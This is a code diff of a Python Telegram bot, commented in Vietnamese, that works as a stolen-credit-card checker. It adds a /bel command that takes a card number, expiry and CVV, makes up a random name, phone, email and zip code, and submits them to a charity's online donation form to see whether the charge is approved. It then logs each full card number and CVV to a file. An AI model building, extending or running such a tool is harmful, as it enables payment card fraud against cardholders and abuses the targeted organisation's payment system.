@@ -86,131 +86,83 @@ async def unallow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("Bạn không có quyền thực hiện lệnh này.")
 
-# Hàm xử lý tin nhắn
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_input = update.message.text
-    card_info_list = user_input.splitlines()  # Tách các thẻ theo từng dòng
-    card_results = []
-    total_time = 0
-    found_valid_card = False  # Biến để kiểm tra nếu có thẻ hợp lệ
+# Hàm xử lý lệnh /bel
+async def bel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_input = " ".join(context.args)
+    card_info = extract_card_info(user_input)
 
-    with open("allowed_users.txt", "r") as f:
-        allowed_users = {int(line.strip()) for line in f.readlines()}
+    if card_info:
+        cc, mes, ano, cvv = card_info
+        current_year = int(datetime.now().strftime("%y"))
+        current_full_year = int(datetime.now().strftime("%Y"))
+        current_month = int(datetime.now().strftime("%m"))
 
-    if update.effective_user.id not in allowed_users:
-        await update.message.reply_text("Người Dùng Không Được Phép Sử Dụng.")
-        return
+        if len(ano) == 2:
+            ano = "20" + ano
+        ano = int(ano)
 
-    for card_input in card_info_list[:10]:  # Chỉ lấy tối đa 10 thẻ
-        card_info = extract_card_info(card_input)
-        if card_info:
-            found_valid_card = True  # Đánh dấu là có thẻ hợp lệ
-            cc, mes, ano, cvv = card_info
+        if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
+            await update.message.reply_text(f"Thẻ {cc} hết hạn.")
+            return
 
-            # Kiểm tra tháng và năm hết hạn
-            current_year = int(datetime.now().strftime("%y"))
-            current_full_year = int(datetime.now().strftime("%Y"))
-            current_month = int(datetime.now().strftime("%m"))
+        phone = random_num(710000009, 900000009)
+        email = random_email()
+        name = random_name()
+        zipcode = random_zipcode()
 
-            if len(ano) == 2:
-                ano = "20" + ano
-            ano = int(ano)
+        await update.message.reply_text(f"Đang xử lý thẻ {cc}...")
 
-            if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
-                card_results.append(f"Thẻ {cc} hết hạn.")
-                continue
+        start_time = time.time()  # Đo thời gian bắt đầu
+        async with aiohttp.ClientSession() as session:
+            async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
+                                    data={
+                                        'tfa_4': 'tfa_5',
+                                        'tfa_52': 'tfa_53',
+                                        'tfa_7': 'tfa_317',
+                                        'tfa_19': '1',
+                                        'tfa_20': '',
+                                        'tfa_21': name,
+                                        'tfa_23': 'Vu',
+                                        'tfa_27': phone,
+                                        'tfa_2276': zipcode,
+                                        'tfa_25': email,
+                                        'tfa_48': 'Web',
+                                        'tfa_50': 'tfa_50',
+                                        'tfa_59': cc,
+                                        'tfa_60': mes,
+                                        'tfa_70': ano,
+                                        'tfa_62': cvv,
+                                        'tfa_2273': 'G-BCL7XEG4WC',
+                                        'tfa_2274': 'GTM-WMPTRWL',
+                                        'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
+                                        'tfa_dbFormId': '151',
+                                        'tfa_dbResponseId': '',
+                                        'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
+                                        'tfa_dbWorkflowSessionUuid': '',
+                                        'tfa_dbTimeStarted': '1727426006',
+                                        'tfa_dbVersionId': '29',
+                                        'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
+                                    }) as response:
 
-            phone = random_num(710000009, 900000009)
-            email = random_email()
-            name = random_name()
-            zipcode = random_zipcode()
+            response_text = await response.text()
+            response_time = time.time() - start_time  # Đo thời gian phản hồi
 
-            await update.message.reply_text(f"Đang xử lý thẻ {cc}...")
-
-            # Gửi yêu cầu tới API
-            start_time = time.time()  # Đo thời gian bắt đầu
-            async with aiohttp.ClientSession() as session:
-                async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
-                                        data={
-                                            'tfa_4': 'tfa_5',
-                                            'tfa_52': 'tfa_53',
-                                            'tfa_7': 'tfa_317',
-                                            'tfa_19': '1',
-                                            'tfa_20': '',
-                                            'tfa_21': name,
-                                            'tfa_23': 'Vu',
-                                            'tfa_27': phone,
-                                            'tfa_2276': zipcode,
-                                            'tfa_25': email,
-                                            'tfa_48': 'Web',
-                                            'tfa_50': 'tfa_50',
-                                            'tfa_59': cc,
-                                            'tfa_60': mes,
-                                            'tfa_70': ano,
-                                            'tfa_62': cvv,
-                                            'tfa_2273': 'G-BCL7XEG4WC',
-                                            'tfa_2274': 'GTM-WMPTRWL',
-                                            'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
-                                            'tfa_dbFormId': '151',
-                                            'tfa_dbResponseId': '',
-                                            'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
-                                            'tfa_dbWorkflowSessionUuid': '',
-                                            'tfa_dbTimeStarted': '1727426006',
-                                            'tfa_dbVersionId': '29',
-                                            'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
-                                        }) as response:
-
-                    response_text = await response.text()
-                    response_time = time.time() - start_time  # Đo thời gian phản hồi
-                    total_time += response_time
-
-                    # Kiểm tra chuyển hướng
-                    if response.history and response.status == 200:
-                        final_url = str(response.url)
-                        if "success" in final_url:
-                            card_results.append(f"Thẻ {cc} đã được phê duyệt!")
-                        else:
-                            error_message = extract_error_message(response_text)
-                            card_results.append(f"Thẻ {cc} bị từ chối: {error_message if error_message else 'Không rõ lý do.'}")
-                    else:
-                        card_results.append(f"Thẻ {cc} không thành công.")
-
-            await asyncio.sleep(5)  # Nghỉ 5 giây giữa các yêu cầu
-
-        else:
-            card_results.append(f"Thông tin thẻ không hợp lệ: {card_input}")
-
-    if found_valid_card:
-        # Cập nhật tin nhắn cuối cùng với kết quả
-        result_message = "\n".join(card_results) + f"\nTổng thời gian: {total_time:.2f} giây"
-        await update.message.reply_text(result_message)
-
-        # Ghi log
-        with open("user_logs.txt", "a", encoding="utf-8") as log_file:  # Ghi log với mã hóa utf-8
-            for card_input, result in zip(card_info_list[:10], card_results):
-                card_info = extract_card_info(card_input)
-                if card_info:
-                    cc, mes, ano, cvv = card_info
-                    log_file.write(f"User ID: {update.effective_user.id}, Card: {cc}, Month: {mes}, Year: {ano}, CVV: {cvv}, Result: {result}\n")
+            # Kiểm tra chuyển hướng
+            if response.history and response.status == 200:
+                final_url = str(response.url)
+                if "success" in final_url:
+                    await update.message.reply_text(f"Thẻ {cc} đã được phê duyệt!")
                 else:
-                    log_file.write(f"User ID: {update.effective_user.id}, Result: Thông tin thẻ không hợp lệ: {card_input}\n")
-    else:
-        await update.message.reply_text("Tin nhắn không chứa thông tin thẻ hợp lệ.")
-
-
-    # Cập nhật tin nhắn cuối cùng với kết quả
-    result_message = "\n".join(card_results) + f"\nTổng thời gian: {total_time:.2f} giây"
-    await update.message.reply_text(result_message)
-
-    # Ghi log
-    with open("user_logs.txt", "a", encoding="utf-8") as log_file:  # Ghi log với mã hóa utf-8
-        for card_input, result in zip(card_info_list[:10], card_results):
-            card_info = extract_card_info(card_input)
-            if card_info:
-                cc, mes, ano, cvv = card_info
-                log_file.write(f"User ID: {update.effective_user.id}, Card: {cc}, Month: {mes}, Year: {ano}, CVV: {cvv}, Result: {result}\n")
+                    error_message = extract_error_message(response_text)
+                    await update.message.reply_text(f"Thẻ {cc} bị từ chối: {error_message if error_message else 'Không rõ lý do.'}")
             else:
-                log_file.write(f"User ID: {update.effective_user.id}, Result: Thông tin thẻ không hợp lệ: {card_input}\n")
+                await update.message.reply_text(f"Thẻ {cc} không thành công.")
+
+            # Ghi log
+            with open("user_logs.txt", "a", encoding="utf-8") as log_file:
+                log_file.write(f"User ID: {update.effective_user.id}, Card: {cc}, Month: {mes}, Year: {ano}, CVV: {cvv}, Result: {'Approved' if 'success' in final_url else 'Declined'}\n")
+    else:
+        await update.message.reply_text("Thông tin thẻ không hợp lệ. Vui lòng nhập lại theo định dạng: <cc>|<mes>|<ano>|<cvv>")
 
 # Hàm chính để khởi động bot
 async def main():
@@ -219,7 +171,8 @@ async def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("allow", allow_user))
     app.add_handler(CommandHandler("unallow", unallow_user))
-    app.add_handler(MessageHandler(filters.text & ~filters.command, handle_message))
+    app.add_handler(CommandHandler("bel", bel_command))  # Thêm lệnh /bel
+    # Không cần MessageHandler ở đây vì không muốn nhận diện mọi tin nhắn
 
     await app.run_polling()
 
